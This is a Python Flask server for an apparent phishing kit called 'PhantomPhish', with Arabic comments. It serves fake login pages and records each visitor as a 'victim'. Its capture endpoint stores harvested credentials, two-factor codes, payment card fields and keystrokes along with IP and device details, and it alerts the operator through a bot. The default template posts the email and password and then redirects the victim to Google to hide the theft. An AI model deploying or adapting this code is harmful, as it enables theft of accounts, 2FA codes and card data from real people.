#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify, render_template_string, send_file, abort
from flask_cors import CORS
import asyncio
import json
import base64
from datetime import datetime
import threading
import uuid

from database import db
from config import config

app = Flask(__name__)
CORS(app)

# تخزين الحملات في الذاكرة للوصول السريع
campaigns_cache = {}

@app.route('/')
def index():
    """الصفحة الرئيسية"""
    return jsonify({
        "name": "PhantomPhish API",
        "version": "4.0",
        "status": "running",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/c/<campaign_id>')
def serve_campaign(campaign_id):
    """تقديم صفحة الحملة"""
    campaign = db.get_campaign(campaign_id)
    
    if not campaign or campaign['status'] != 'active':
        return "404 Not Found", 404
    
    # تحديث عداد الزيارات
    db.update_campaign_stats(campaign_id, click=True)
    
    # الحصول على HTML
    html_content = campaign.get('html_content')
    if not html_content:
        html_content = get_default_html(campaign)
    
    return html_content

@app.route('/preview/<campaign_id>')
def preview_campaign(campaign_id):
    """معاينة الحملة"""
    campaign = db.get_campaign(campaign_id)
    
    if not campaign:
        return "404 Not Found", 404
    
    html_content = campaign.get('html_content')
    if not html_content:
        html_content = get_default_html(campaign)
    
    # إضافة شريط معاينة
    preview_bar = '''
    <div style="position:fixed;top:0;left:0;right:0;background:#ff6b6b;color:white;padding:10px;text-align:center;z-index:9999;font-family:Arial;">
        <strong>👁️ وضع المعاينة - Preview Mode</strong>
        <span style="margin-left:20px;">لن يتم إرسال أي بيانات</span>
    </div>
    <div style="margin-top:50px;"></div>
    '''
    
    # إضافة الشريط في بداية body
    html_content = html_content.replace('<body>', '<body>' + preview_bar)
    
    return html_content

@app.route('/api/capture/<campaign_id>', methods=['POST'])
def capture_data(campaign_id):
    """نقطة التقاط البيانات"""
    campaign = db.get_campaign(campaign_id)
    
    if not campaign:
        return jsonify({"error": "Campaign not found"}), 404
    
    data = request.get_json() or {}
    
    # معلومات الطلب
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', '')
    
    # تحليل User Agent
    device_info = parse_user_agent(user_agent)
    
    # معلومات الموقع الجغرافي (يمكن إضافة GeoIP)
    geo_info = {
        'country': request.headers.get('CF-IPCountry', 'Unknown'),
        'city': 'Unknown',
        'latitude': 0,
        'longitude': 0,
        'isp': 'Unknown'
    }
    
    # إنشاء/الحصول على الضحية
    session_id = data.get('session_id', str(uuid.uuid4()))
    
    victim_id = db.create_victim(
        campaign_id=campaign_id,
        session_id=session_id,
        ip=ip,
        user_agent=user_agent,
        device_info=device_info,
        geo_info=geo_info
    )
    
    # معالجة البيانات الملتقطة
    capture_type = data.get('type', 'unknown')
    
    if capture_type == 'credentials':
        credentials = data.get('data', {})
        for field, value in credentials.items():
            db.add_capture(
                victim_id=victim_id,
                field_type='credential',
                field_name=field,
                field_value=str(value),
                page_url=data.get('url', ''),
                metadata={
                    'screen': data.get('screen'),
                    'timezone': data.get('timezone'),
                    'language': data.get('language')
                }
            )
        
        # إرسال إشعار
        asyncio.run_coroutine_threadsafe(
            send_capture_notification(campaign_id, victim_id, credentials),
            asyncio.get_event_loop()
        )
        
    elif capture_type == '2fa':
        code = data.get('data', {}).get('code', '')
        db.add_capture(
            victim_id=victim_id,
            field_type='2fa',
            field_name='verification_code',
            field_value=code,
            page_url=data.get('url', '')
        )
        
    elif capture_type == 'card':
        card_data = data.get('data', {})
        for field, value in card_data.items():
            db.add_capture(
                victim_id=victim_id,
                field_type='card',
                field_name=field,
                field_value=str(value),
                page_url=data.get('url', '')
            )
        
    elif capture_type == 'keystrokes':
        keystrokes = data.get('data', [])
        if keystrokes:
            field_name = keystrokes[0].get('field', 'unknown')
            db.add_keystrokes(victim_id, field_name, keystrokes)
    
    elif capture_type == 'pageview':
        pass  # فقط تسجيل الزيارة
    
    # تحديث عداد التقاط
    db.update_campaign_stats(campaign_id, capture=True)
    
    return jsonify({"status": "success", "timestamp": datetime.now().isoformat()})

async def send_capture_notification(campaign_id, victim_id, data):
    """إرسال إشعار بالتقاط"""
    from bot import bot, notify_capture
    await notify_capture(campaign_id, victim_id, data)

def parse_user_agent(ua_string):
    """تحليل User Agent"""
    ua_lower = ua_string.lower()
    
    # نوع الجهاز
    if any(x in ua_lower for x in ['mobile', 'android', 'iphone', 'ipod']):
        device_type = 'Mobile'
    elif any(x in ua_lower for x in ['tablet', 'ipad']):
        device_type = 'Tablet'
    else:
        device_type = 'Desktop'
    
    # نظام التشغيل
    if 'windows' in ua_lower:
        os = 'Windows'
    elif 'mac' in ua_lower:
        os = 'macOS'
    elif 'linux' in ua_lower:
        os = 'Linux'
    elif 'android' in ua_lower:
        os = 'Android'
    elif any(x in ua_lower for x in ['ios', 'iphone', 'ipad']):
        os = 'iOS'
    else:
        os = 'Unknown'
    
    # المتصفح
    if 'edg' in ua_lower:
        browser = 'Edge'
    elif 'opr' in ua_lower or 'opera' in ua_lower:
        browser = 'Opera'
    elif 'chrome' in ua_lower:
        browser = 'Chrome'
    elif 'firefox' in ua_lower:
        browser = 'Firefox'
    elif 'safari' in ua_lower:
        browser = 'Safari'
    else:
        browser = 'Unknown'
    
    return {
        'device_type': device_type,
        'os': os,
        'browser': browser
    }

def get_default_html(campaign):
    """HTML افتراضي"""
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>{campaign['name']}</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: Arial; max-width: 400px; margin: 50px auto; padding: 20px; }}
            input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }}
            button {{ width: 100%; padding: 12px; background: #1877F2; color: white; border: none; border-radius: 4px; cursor: pointer; }}
        </style>
    </head>
    <body>
        <h2>{campaign['name']}</h2>
        <form id="login">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
        <script>
            document.getElementById('login').addEventListener('submit', async function(e) {{
                e.preventDefault();
                const formData = new FormData(this);
                const data = {{}};
                for (let [k, v] of formData.entries()) data[k] = v;
                
                await fetch('/api/capture/{campaign['campaign_id']}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: Math.random().toString(36),
                        type: 'credentials',
                        data: data,
                        user_agent: navigator.userAgent
                    }})
                }});
                
                window.location.href = 'https://google.com';
            }});
        </script>
    </body>
    </html>
    '''

@app.route('/health')
def health_check():
    """فحص الصحة"""
    stats = db.get_global_stats()
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "stats": stats
    })

@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Not found"}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Server error"}), 500

if __name__ == '__main__':
    print(f"""
    🌐 PhantomPhish Web Server v4.0
    =================================
    [+] Port: {config.PORT}
    [+] URL: {config.PUBLIC_URL}
    [+] Capture API: /api/capture/<campaign_id>
    [+] Preview: /preview/<campaign_id>
    """)
    
    app.run(host=config.HOST, port=config.PORT, debug=False, threaded=True)
